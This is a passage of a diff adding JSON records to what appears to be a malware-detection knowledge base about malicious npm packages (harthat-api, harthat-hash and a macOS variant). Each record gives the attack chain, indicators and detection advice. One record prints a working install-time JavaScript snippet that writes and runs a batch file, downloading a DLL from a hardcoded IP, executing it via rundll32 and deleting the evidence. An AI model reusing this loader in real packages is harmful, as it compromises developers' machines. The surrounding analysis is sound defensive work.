+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Binary runs persistently and initiates outbound network communication."
+                  },
+                  {
+                    "step": 3,
+                    "action": "Installer script deletes itself and, in some variants, overwrites package.json to erase evidence of the malicious installation.",
+                    "implemented_by": [
+                      "snippet_2",
+                      "snippet_3"
+                    ],
+                    "leads_to": "Anti-forensics; hinders detection, analysis, and incident response."
+                  },
+                  {
+                    "step": 4,
+                    "action": "Mach-O binary connects to a remote server to download a stage 2 payload, possibly using system fingerprinting.",
+                    "implemented_by": [
+                      "snippet_4"
+                    ],
+                    "leads_to": "Potential delivery and execution of further malicious payloads, with the final goal of system compromise or data exfiltration."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "Postinstall script creates and executes binaries outside the package directory, specifically in '~/Library/Application Support/'",
+                    "Use of misleading file names (e.g., 'travis.yml' as a Mach-O binary, 'updateSafari')",
+                    "Immediate deletion of installer scripts (e.g., 'package-lock.js') after execution",
+                    "Overwriting of 'package.json' or other core metadata files with empty or invalid content",
+                    "Background execution of binaries using 'nohup' during npm install",
+                    "Outbound network connections to unknown or suspicious domains immediately after install"
+                  ],
+                  "file_indicators": [
+                    "Presence of 'travis.yml' file in the package that is a Mach-O binary, not a YAML file",
+                    "'~/Library/Application Support/Safari Update/updateSafari' binary present on disk",
+                    "package-lock.js containing postinstall execution logic",
+                    "package.json overwritten with empty object ('{}') after install"
+                  ],
+                  "network_indicators": [
+                    "Connections to hxxps://passgenwizard[.]com/ts/getTs.asp?id=83401",
+                    "Download attempts for 'vfcompat.dll' from passgenwizard[.]com or similar suspicious domains"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for postinstall scripts that create or execute binaries outside the package directory, especially in '~/Library/Application Support/'. Flag any package that drops a file named 'travis.yml' that is not valid YAML or is a Mach-O binary. Detect self-deleting installer scripts (e.g., deletion of 'package-lock.js') and overwrites of 'package.json' with empty content. Monitor for outbound connections to known malicious domains (such as passgenwizard[.]com) immediately after package installation. Correlate these behaviors to identify supply chain attacks leveraging npm postinstall scripts."
+                }
+              }
+            },
+            {
+              "match_id": "20241223_205532_450584_snippet_2",
+              "source_package": "harthat-api, harthat-hash (npm)",
+              "source_file": "/var/folders/30/nqm8gs811y315kdzbscpftyc0000gp/T/kb_build_g7qah3_m/20241223_205532_450584/verify.json",
+              "match_type": "combined",
+              "similarity_score": 0.5739562511444092,
+              "code_similarity": 0.6372632384300232,
+              "behavior_similarity": 0.5106493234634399,
+              "matched_snippet": {
+                "snippet_id": "snippet_2",
+                "code_snippet": "const data = '@echo off\\ncurl -o Temp.b -L \"http://142.111.77.196/user/user.asp?id=G6A822B\" > nul 2>&1\\nrename Temp.b package.db > nul 2>&1\\nrundll32 package.db,GenerateKey 1234\\ndel \"package.db\"\\nif exist \"pk.json\" (\\ndel \"package.json\" > nul 2>&1\\nrename \"pk.json\" \"package.json\" > nul 2>&1\\n)';\n\nif (osType === 'Windows_NT') {\n  const fileName = 'package.bat';\n  fs.writeFile(fileName, data, (err) => {\n    if (!err) {\n      const child = exec(`\"${fileName}\"`, (error, stdout, stderr) => {\n        if (error) { return; }\n        if (stderr) { return; }\n        fs.unlink(fileName, (err) => {});\n      });\n    }\n  });\n}",
+                "code_behavior": "During installation, deference.js writes a batch script (package.bat) that downloads a DLL from a remote C2 server, renames and executes it using rundll32.exe, deletes the DLL, and restores a benign package.json, resulting in remote code execution and anti-forensics cleanup.",
+                "malice_analysis": {
+                  "why_suspicious": "The script programmatically creates and executes a batch file that downloads and runs a DLL from a suspicious external IP address using system tools. It then deletes the payload and restores the original package.json, indicating a clear attempt to evade detection and maintain operational security.",
+                  "violated_expectations": "Normal npm packages do not download and execute remote binaries, nor do they manipulate package.json to hide malicious modifications.",
+                  "similar_legitimate_use": "Rarely, legitimate installers may download dependencies, but not DLLs from untrusted sources or execute them with rundll32.exe. Restoration of package.json is not a standard practice.",
+                  "key_indicators": [
+                    "JavaScript writes and executes a batch file during installation",
+                    "batch file downloads executable from hardcoded external IP",
+                    "uses rundll32.exe to execute downloaded DLL",
+                    "restores package.json from backup (pk.json) after execution"
+                  ]
+                },
+                "execution_context": {
+                  "trigger": "preinstall (via deference.js)",
+                  "file_location": "deference.js",
+                  "required_permissions": [
+                    "filesystem",
+                    "network",
+                    "process_execution"
+                  ]
+                },
+                "package_info": {
+                  "package_name": "harthat-api, harthat-hash",
+                  "package_manager": "npm",
+                  "package_versions": "harthat-api v1.3.1, harthat-hash v1.3.3",
+                  "why_malicious": "These packages execute malicious code during installation by leveraging npm preinstall scripts to download and execute a DLL payload from a remote command-and-control (C2) server. The attack uses anti-forensics techniques such as deleting the installer script and restoring a benign package.json to evade detection. It abuses trusted system binaries (rundll32.exe) to execute the downloaded DLL, enabling arbitrary code execution on the victim system. The packages are part of a supply chain attack targeting developer and CI environments, exhibiting tactics, techniques, and procedures (TTPs) consistent with known nation-state actors."
+                },
+                "attack_chain": [
+                  {
+                    "step": 1,
+                    "action": "During npm install, the preinstall script in package.json triggers execution of deference.js.",
+                    "implemented_by": [
+                      "snippet_1"
+                    ],
+                    "leads_to": "Execution of deference.js, which writes and runs a malicious batch file."
+                  },
+                  {
+                    "step": 2,
+                    "action": "deference.js writes a batch script (package.bat) containing commands to download and execute a DLL payload, then runs the batch file.",
+                    "implemented_by": [
+                      "snippet_2"
+                    ],
+                    "leads_to": "Batch script downloads and executes the DLL payload."
+                  },
+                  {
+                    "step": 3,
+                    "action": "The batch script downloads a DLL from the C2 server, executes it with rundll32.exe, deletes the DLL, and restores the original package.json.",
+                    "implemented_by": [
+                      "snippet_3"
+                    ],
+                    "leads_to": "DLL payload is executed on the victim system; evidence is deleted to evade detection."
+                  }
+                ],
+                "detection_knowledge": {
+                  "behavioral_signatures": [
+                    "npm preinstall script executes local JavaScript file (deference.js)",
+                    "JavaScript writes and executes batch files (package.bat) during installation",
+                    "Batch script downloads and executes DLLs from hardcoded external IP addresses",
+                    "Immediate deletion of installer scripts (deference.js, package.bat) and restoration of package.json from pk.json"
+                  ],
+                  "file_indicators": [
+                    "package.json with preinstall: node deference.js && del deference.js",
+                    "deference.js present in package root",
+                    "package.bat created and deleted during install",
+                    "Temp.b and package.db (DLL) appear in install directory during install",
+                    "pk.json as backup of package.json"
+                  ],
+                  "network_indicators": [
+                    "HTTP requests to 142.111.77.196/user/user.asp",
+                    "Download of Temp.b or package.db from 142.111.77.196"
+                  ],
+                  "how_to_detect": "Monitor npm package installations for preinstall scripts that execute local JavaScript files and immediately delete them. Flag packages that write and execute batch files, especially those that use curl to download binaries from hardcoded IP addresses and execute them with rundll32.exe. Look for transient files such as deference.js, package.bat, Temp.b, and package.db in the install directory during installation. Monitor for HTTP requests to suspicious IPs (e.g., 142.111.77.196) during package installation. File integrity monitoring should detect restoration of package.json from pk.json as an anti-forensics step."
+                }
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
